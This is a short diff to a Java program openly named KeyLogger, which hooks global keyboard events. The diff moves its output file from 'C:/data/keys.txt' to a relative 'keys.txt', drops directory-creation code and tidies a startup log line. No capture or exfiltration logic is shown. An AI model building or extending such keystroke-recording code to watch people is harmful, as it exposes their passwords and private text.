@@ -19,23 +19,13 @@ import org.slf4j.LoggerFactory;
 
 public class KeyLogger implements NativeKeyListener {
 
-    private static final Path file = Paths.get("C:/data/keys.txt");
+    private static final Path file = Paths.get("keys.txt");
 
     private static final Logger logger4j = LoggerFactory.getLogger(KeyLogger.class);
 
     public static void main(String[] args) {
 
-        logger4j.info("Key logger has started " + new Date());
-
-        try {
-            Path dir = file.getParent();
-            if (!Files.exists(dir)) {
-                Files.createDirectories(dir);
-            }
-        } catch (IOException e) {
-            logger4j.error("Failed to create directory: " + e.getMessage(), e);
-            System.exit(-1);
-        }
+        logger4j.info("Key logger has started {}", new Date());
 
         init();
 
